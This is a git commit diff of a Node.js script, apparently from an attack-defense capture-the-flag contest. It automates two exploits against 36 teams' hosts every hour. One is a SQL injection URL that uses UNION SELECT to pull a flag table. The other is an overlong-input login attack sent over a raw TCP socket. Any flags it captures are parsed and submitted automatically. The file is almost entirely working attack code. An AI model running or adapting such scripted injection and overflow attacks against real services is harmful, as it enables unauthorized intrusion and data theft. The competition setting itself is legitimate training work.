c734a03f6336cdf76cbd7dfbe4b9e43181d6614f
Ting-Yen Lai <banacorn@gmail.com>
2015-06-24 14:09:27 +0800

    ssp attack

--- main.js
+++ main.js
@@ -1,12 +1,9 @@
 var http = require('http');
+var net = require('net');
 var colors = require('colors');
 var exec = require('child_process').exec;
 var schedule = require('node-schedule');
 
-// assembles injection code
-var genInjectionCode = function (team) {
-    return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
-}
 
 // submit flag
 var submit = function (flag) {
@@ -14,15 +11,32 @@ var submit = function (flag) {
     child = exec(command);
 }
 
-// regex for flag scrawling
-var regex = /\>(\d) (\w*)\<\/div\>/;
+var parseFlag = function (regex, data) {
+    match = data.toString().match(regex);
+    if (match) {
+        var flag = match[1];
+        return match[1];
+    }
+}
 
-var attack = function (team) {
+
+//
+//  PMC Injection
+//
+
+// assembles injection code
+var genInjectionCode = function (team) {
+    return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
+}
+// regex for flag scrawling
+var regexPMCNameFlag = /\>(\d) (\w*)\<\/div\>/;
+
+var attackPMC = function (team) {
     // console.log('ATTACKING: '.green + genInjectionCode(team));
     var req = http.request(genInjectionCode(team), function (res) {
         res.setEncoding('utf8');
         res.on('data', function (chunk) {
-            match = chunk.toString().match(regex);
+            match = chunk.toString().match(regexPMCNameFlag);
             if (match) {
                 var flag = match[2];
                 console.log('FLAG: '.yellow, team, flag);
@@ -37,10 +51,38 @@ var attack = function (team) {
     req.end();
 }
 
+
+//
+//  SSP Login Attack
+//
+
+
+var regexSSPLoginFlag = /Exit\n#(\w+)/
+var attackSSP = function (team) {
+    var target = {
+        port: 5566,
+        host: '10.8.' + team.toString() + '.100'
+    };
+
+    var conn = net.connect(target, function () {
+        conn.write('11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1\n3\n8\n');
+    });
+
+    conn.on('data', function(data) {
+        result = parseFlag(regexSSPLoginFlag, data);
+        if (result) {
+            console.log('Flag: '.yellow, team, result);
+            submit(result);
+        }
+    });
+};
+
 var rule = new schedule.RecurrenceRule();
 rule.minute = 0;
 var j = schedule.scheduleJob(rule, function(){
     console.log('====== START ATTACKING ====='.red);
-    for (i = 0; i < 36; i++)
-        attack(i);
+    for (i = 0; i < 36; i++) {
+        attackPMC(i);
+        attackSSP(i);
+    }
 });
